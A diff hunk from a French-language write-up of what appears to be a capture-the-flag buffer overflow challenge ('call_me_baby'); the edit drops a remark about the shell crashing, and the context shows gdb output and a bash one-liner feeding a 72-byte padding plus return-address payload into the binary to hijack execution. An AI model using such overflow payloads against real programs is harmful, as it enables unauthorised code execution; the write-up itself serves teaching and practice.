@@ -456,7 +456,7 @@ Error in re-setting breakpoint 2: No symbol "call_me" in current context.
 [Inferior 1 (process 6977) exited normally]
 ```
 
-On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :
+On arrive bien au message de succès. Testons le payload directement sur l'executable :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
